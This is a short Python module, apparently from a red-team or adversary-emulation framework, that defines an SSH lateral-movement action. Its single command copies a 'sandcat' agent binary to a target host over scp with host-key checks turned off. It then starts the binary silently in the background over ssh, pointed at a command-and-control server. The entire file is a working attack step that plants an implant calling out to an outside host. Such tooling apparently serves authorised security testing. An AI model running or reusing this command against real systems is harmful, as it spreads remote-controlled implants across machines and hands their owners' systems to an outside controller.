from ..low_level_action import LowLevelAction
from incalmo.core.models.attacker.agent import Agent
from config.settings import settings


class SSHLateralMove(LowLevelAction):
    def __init__(self, agent: Agent, hostname: str):
        self.hostname = hostname
        command = f"""scp -o StrictHostKeyChecking=no
          -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux {hostname}:~/sandcat_tmp.go
          &&
          ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
          -o ConnectTimeout=3 {hostname} 'nohup ./sandcat_tmp.go -server {settings.c2_server}
          -group red 1>/dev/null 2>/dev/null &'"""
        super().__init__(agent, command)
